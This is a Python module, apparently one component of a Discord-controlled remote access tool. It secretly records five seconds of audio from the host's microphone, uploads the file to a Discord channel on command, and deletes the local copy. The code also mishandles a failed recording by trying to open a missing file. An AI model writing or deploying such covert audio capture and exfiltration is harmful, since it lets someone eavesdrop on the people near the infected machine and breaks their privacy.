#thirt-party import
import discord
import sounddevice as sd
import soundfile as sf
import asyncio

#build-in import
import os	

#local import


class AudioRecord:
    def __init__(self):
        self.duration = 5   # record for 5 seconds
        self.fs = 48000     # sample rate
        self.channels = 2   # stereo recording

    def _recording(self):
        try:
            # Start recording
            print(f"Recording {self.duration} seconds of audio...")
            recording = sd.rec(int(self.duration * self.fs), samplerate=self.fs, channels=self.channels)
            sd.wait()  # Wait until recording is finished

            # Save recording to file
            audiofile = "recording.wav"
            sf.write(audiofile, recording, self.fs)
            return audiofile
    
        except Exception as error:
            print(f"Error: {error}")
            return None
        


    async def record_audio(self, ctx):
        loop = asyncio.get_event_loop()
        audiofile = await loop.run_in_executor(None, self._recording)

        if audiofile is None:
            await ctx.send(f"[!] An error has occurred.")

        try:
            with open(audiofile, "rb") as f:
                audiofile = discord.File(f, filename="recording.wav")
                await ctx.send(file=audiofile)
        finally:
            os.remove("recording.wav")
            
            
